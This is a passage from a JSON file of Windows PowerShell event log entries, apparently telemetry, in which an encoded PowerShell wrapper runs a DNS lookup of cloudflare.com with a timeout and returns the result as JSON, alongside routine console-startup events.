AAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEQAbgBzAF0AOgA6AEcAZQB0AEgAbwBzAHQAQQBkAGQAcgBlAHMAcwBlAHMAKAAiAGMAbABvAHUAZABmAGwAYQByAGUALgBjAG8AbQAiACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "$commandToRun = @'\n[System.Net.Dns]::GetHostAddresses(\"cloudflare.com\")\n'@\n$timeoutSeconds = 25\n$result = @{\n    Stdout = \"\"\n    Stderr = \"\"\n    ReturnCode = -1\n}\ntry {\n    $scriptBlock = [scriptblock]::Create($commandToRun)\n    $job = Start-Job -ScriptBlock $scriptBlock\n    if (Wait-Job -Job $job -Timeout $timeoutSeconds) {\n        $output = Receive-Job -Job $job\n        $result.Stdout = ($output | Out-String).Trim()\n        if ($job.State -eq 'Failed') {\n            $result.Stderr = $job.ChildJobs[0].JobStateInfo.Reason.Message\n            $result.ReturnCode = 1\n        } else {\n            $result.ReturnCode = 0\n        }\n    } else {\n        $result.Stderr = \"Command timed out on the server after $timeoutSeconds seconds.\"\n        $result.ReturnCode = 124\n    }\n} catch {\n    $result.Stderr = \"Wrapper Script Error: $($_.Exception.Message)\"\n    $result.ReturnCode = 1\n} finally {\n    if ($job) {\n        Stop-Job -Job $job -ErrorAction SilentlyContinue\n        Remove-Job -Job $job -ErrorAction SilentlyContinue -Force\n    }\n}\n$result | ConvertTo-Json -Compress"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40962,
      "details": "PowerShell console is ready for user input"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 53504,
      "details": "Windows PowerShell has started an IPC listening thread on process: 7272 in AppDomain: DefaultAppDomain."
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40961,
      "details": "PowerShell console is starting up"
    }
  ]
}